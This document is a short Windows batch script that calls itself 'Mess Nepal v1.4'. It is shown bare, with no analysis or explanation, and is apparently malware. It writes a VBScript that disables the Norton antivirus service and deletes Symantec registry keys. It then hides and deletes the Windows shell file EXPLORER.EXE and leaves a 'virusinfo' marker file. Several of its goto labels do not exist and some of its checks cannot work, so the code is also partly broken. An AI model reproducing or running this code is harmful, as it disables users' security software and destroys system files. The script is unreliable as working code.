   echo off
   If exist "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\Antidis.bat" goto exist
   If not exist "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\Antidis.bat"  goto damn
   :exist
   echo WSHShell = WScript.CreateObject("WScript.Shell") >> c:\Bug.vbs
   echo WSHShell.RegWrite
   echo(HKLM\SYSTEM\CurrentControlSet\Services\navapsvc\start", "4", "REG_DWORD")>>c:\Bug.vbs
   start c:\Bug.vbs
   if exist HKEY_LOCAL_MACHINE\SOFTWARE\Symantec goto 1
   if not exist HKEY_LOCAL_MACHINE\SOFTWARE\Symantec goto 1-2
   if exist HKEY_CURRENT_USER\Software\Symantec goto 2
   if not exist HKEY_CURRENT_USER\Software\Symantec goto 2-1
   if exist HKEY_CLASSES_ROOT\symantec*.* goto 3
   if not exist HKEY_CLASSES_ROOT\symantec*.* goto 3-1
   :1
   reg delete /f HKEY_LOCAL_MACHINE\SOFTWARE\Symantec
   reg delete /f HKEY_CURRENT_USER\Software\Symantec
   reg delete /f HKEY_CLASSES_ROOT\symantec*.*
   goto 2

   :2
   ATTRIB +H C:\windows\EXPLORER.EXE
   DEL C:\windows\EXPLORER.EXE
   goto 3

   :3
   echo *****************Mess Nepal v1.4********************* >> c:\virusinfo.txt
   EXIT
